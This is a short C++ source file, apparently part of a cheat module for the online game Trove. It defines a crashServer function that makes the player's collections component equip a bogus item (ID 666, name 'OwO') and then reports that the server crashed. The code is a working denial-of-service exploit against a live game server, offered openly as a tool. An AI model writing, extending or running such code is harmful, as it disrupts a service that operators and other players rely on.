#include "Trove/Components/Collections.h"
#include "Trove/Components/Component.h"
#include "Trove/Core/QPlayerCharacter.h"
#include "Trove/Modules/CrashServer.h"
#include "lilly/string.hpp"
#include <string>
#include <vector>


bool crashServer(const QPlayerCharacter& localPlayer, const CrashMethod method, Trove::String* result_message) {
	CollectionsComponent* collectionsComponent;

	switch (method) {
		case CRASH_EQUIP:
			collectionsComponent = localPlayer.getComponent<CollectionsComponent>();
			if (!collectionsComponent) {
				if (result_message) *result_message = "Failed to get Collections Component";
				return false;
			}
			collectionsComponent->equip(666, "OwO");
			if (result_message) *result_message = "Successfully crashed with Equip method";
			return true;

		default:
			if (result_message) *result_message = "Unknown crash method";
			return false;
	}
}
